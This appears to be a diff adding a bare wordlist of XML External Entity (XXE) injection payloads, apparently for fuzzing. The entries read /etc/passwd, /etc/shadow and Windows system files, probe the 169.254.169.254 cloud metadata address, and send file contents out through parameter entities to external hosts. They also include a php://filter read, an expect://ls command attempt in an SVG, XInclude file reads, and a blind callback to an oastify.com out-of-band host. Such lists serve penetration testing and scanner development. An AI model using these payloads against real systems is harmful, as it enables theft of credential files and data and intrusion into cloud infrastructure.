@@ -1,0 +1,27 @@
+<!DOCTYPE replace [<!ENTITY xxe "Doe"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE productId [<!ELEMENT productId (#ANY)><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [ <!ELEMENT foo (#ANY)> <!ENTITY % xxe1 SYSTEM "file:///etc/passwd"> <!ENTITY xxe SYSTEM "https://www.example.com/?%xxe1;">]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254"> ]>
+<!DOCTYPE data [<!ELEMENT xxe (#ANY)><!ENTITY file SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
+<!DOCTYPE replace [<!ENTITY xxe; SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE foo [<!ELEMENT xxe (#ANY)><!ENTITY xxe SYSTEM "file:///etc/passwd">]
+<!DOCTYPE foo [<!ELEMENT foo (#ANY)><!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+<foo><result>&ac;</result></foo>
+<!DOCTYPE foo [<!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]>
+<!DOCTYPE lolz [<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %xxe; ]><foo/>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="expect://ls"></image></svg>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+<xi:include xmlns:xi=”http://www.w3.org/2003/XInclude” parse=”text” href=”file://../../../../../../../../Windows/System32/drivers/etc/hosts”><xi:fallback>Oops!</xi:fallback></xi:include>
+#blind
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://88ef58uc2q710bb0yklwex5uilocc1.oastify.com"> ]>
